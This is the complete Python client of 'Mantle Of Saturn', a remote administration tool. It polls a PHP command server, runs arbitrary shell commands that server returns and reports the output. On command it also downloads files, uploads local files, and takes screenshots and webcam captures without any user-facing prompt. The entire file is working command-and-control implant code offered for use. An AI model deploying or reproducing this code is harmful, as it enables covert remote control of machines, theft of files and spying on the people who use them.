#!/usr/bin/python3
# -*- coding: utf-8	-*-
license = '''
    Mantle Of Saturn - Remote Administration Tool Based on PHP Server and Python Client
    Copyright (C) 2021  Nikolaos Bazigos

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
    
    Official Websites : mantleofsaturn.com , sourcecode347.com
    GitHub : https://github.com/sourcecode347/MantleOfSaturn
    
    '''
print(license)
import subprocess,time,os,sys
from sys import platform
from uuid import getnode as get_mac
mac = get_mac()
#print(mac)
proc = subprocess.Popen("whoami", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
stdout_value = proc.stdout.read() + proc.stderr.read()
global client
client=(stdout_value.decode("utf-8")+"_"+str(mac)).replace("\r","").replace("\n","").replace("\\","_").replace("/","_")
print(client)
###############################################################################
# Settings
###############################################################################
global sleeptime,sitelink
sleeptime=3
sitelink = "https://YOUR-PHP-SERVER/clients.php"
###############################################################################
# Functions
###############################################################################
def activity(client,output):
    from urllib import request, parse
    data = { "clientuser" : client}
    data = parse.urlencode(data)
    data = data.encode()
    req =  request.Request(sitelink, data=data)
    resp = request.urlopen(req).read()
    readcmd = resp.decode("utf-8","ignore")
    #print(readcmd[2:-1])
    return readcmd[2:-1]
def activityOutput(client,output):
    from urllib import request, parse
    data = { "clientuser" : client, "output" : output}
    data = parse.urlencode(data)
    data = data.encode()
    req =  request.Request(sitelink, data=data)
    resp = request.urlopen(req).read()
    readcmd = resp.decode("utf-8","ignore")
    #print(readcmd[2:-1])
    return readcmd[2:-1]
def fdown(url,name):
    try:
        from urllib import request, parse
        url=url.replace("\\","")
        request.urlretrieve(url,name)
        return True
    except:
        pass
        return False
def pic(name):
    if platform == "linux" or platform == "linux2":
        try:
            import pyscreenshot as ImageGrab
            bbox = None
            im = ImageGrab.grab(bbox)
            im.save(name, "PNG")
            return True
        except:
            pass
            return "linux"
    else:
        try:
            from PIL import ImageGrab
            bbox = None
            im = ImageGrab.grab(bbox)
            im.save(name, "PNG")
            return True
        except:
            pass
            return False
def upload(name):
    try:
        import requests
        url = sitelink
        file = {'getfile': (name , open(name, "rb"), "multipart/form-data")}
        data = { "clientuser" : client}
        requests.post(url, files=file , data=data)
        return True
    except:
        pass
        return False
###############################################################################
# Loop
###############################################################################
while True:
    output=""
    newcmd = str(activity(client,output)).replace("?","")
    if platform == "linux" or platform == "linux2":
        newcmd=newcmd.replace("\\","")
    else:
        newcmd=newcmd.replace("\\","")
    if newcmd!="":
        print(newcmd)
    if "set sleeptime " in newcmd:
        sleeptime = int(newcmd.replace("set sleeptime ",""))
        newcmd = ""
        print("sleeptime="+str(sleeptime))
        activityOutput(client,"sleeptime="+str(sleeptime))
    if newcmd.startswith('cd')==True:
        path=newcmd[3:]
        newcmd=""
        try:
            os.chdir(path)
            activityOutput(client,os.getcwd())
        except:
            activityOutput(client,'error')
    if newcmd.startswith('fdown')==True:
        f=newcmd.replace('fdown ','')
        pos=f.find(' ')
        url=f[0:pos]
        name=f[pos+1:]
        df=fdown(url,name)
        if df==True:
            activityOutput(client,'File Downloaded Successfully')
        else:
            activityOutput(client,'error')
        newcmd=""
    if newcmd.startswith('pic')==True:
        f=newcmd.replace('pic ','')
        df=pic(f)
        if df==True:
            activityOutput(client,'Screenshot Saved Successfully')
        elif df=="linux":
            activityOutput(client,'Screenshot Not Executed , maybe missed libraries<br>Try this cmd : <br><br>pip install pyscreenshot<br><br>* or try use pip3')
        else:
            activityOutput(client,'Screenshot Not Executed , maybe missed libraries<br>Try this cmd : <br><br>pip install pillow<br><br>* or try use pip3')
        newcmd=""
    if newcmd.startswith('upload')==True:
        f=newcmd.replace('upload ','')
        df=upload(f)
        if df==True:
            activityOutput(client,'File Uploaded Successfully')
        else:
            activityOutput(client,'File Upload Not Executed , maybe missed libraries<br>Try this cmd : <br><br>pip install requests<br><br>* or try use pip3')
        newcmd=""
    if newcmd.startswith('cam')==True:
        try:
            from cv2 import *
            import numpy
            assert numpy
            image=newcmd[4:]
            cam = VideoCapture(0)
            cm, img = cam.read()
            counter=0
            if cm:
                while True:
                    cm, img = cam.read()
                    counter+=1
                    if counter==200:
                        imwrite(image,img)
                        activityOutput(client,'Camshot Executed Successfully')
                        break
            else:
                activityOutput(client,'Camshot Not Executed , maybe not camera detected (!)<br><br>Example command : <br>cam camshot.jpg')
        except:
            activityOutput(client,'Camshot Not Executed , maybe missed libraries<br>try this commands:<br><br>pip install opencv-python<br>pip install numpy<br><br>* use pip3 if you are in linux system')
            pass
        newcmd=""
    if newcmd != "" :
        proc = subprocess.Popen(newcmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        proc.communicate(input=b'y')
        output = stdout_value.decode("utf-8","ignore")
        print(output)
        activityOutput(client,output.replace('\n','<br>'))
    time.sleep(sleeptime)
